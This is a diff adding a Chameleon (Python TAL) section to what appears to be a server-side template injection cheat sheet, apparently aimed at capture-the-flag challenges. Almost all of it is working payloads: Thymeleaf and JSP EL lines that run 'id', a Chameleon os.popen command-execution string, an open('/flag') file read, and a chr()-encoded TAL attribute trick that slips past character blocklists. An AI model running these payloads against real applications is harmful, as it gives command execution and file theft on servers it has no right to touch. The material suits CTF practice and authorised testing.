@@ -145,6 +145,23 @@ Thymeleaf:   __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
 JSP EL:      ${''.getClass().forName('java.lang.Runtime').getMethod('exec',[Ljava.lang.String;).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),new String[]{'id'})}
 ```
 
+## Chameleon (Python TAL/ZPT — `PageTemplate(x).render()`, Pyramid/`chameleon_flask`)
+
+```
+Detect:      ${7*7}  → 49   (TAL expression interpolation)
+RCE/read:    ${__import__('os').popen('id').read()}
+File read:   ${open('/flag').read()}
+```
+
+Char-filter bypass — when input strips a blocklist like `$ # { } " _ .` (so `${...}` is dead):
+drop interpolation entirely, use **single-quoted TAL attributes** + `chr()`-built strings (no
+`. _ " { } $ #`). `tal:repeat` iterates the file's lines, `tal:content` emits each:
+```
+<tal:x tal:repeat='line open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103))' tal:content='line'>x</tal:x>
+   # chr(47)+chr(102)+...  builds '/flag'  with zero forbidden chars; tal:* tags are omitted from output
+```
+Note: a `markdown()` preprocessing step passes raw HTML (incl. `<tal:...>`) straight through.
+
 ## Sandbox escapes, filter bypasses, file-read
 
 ```
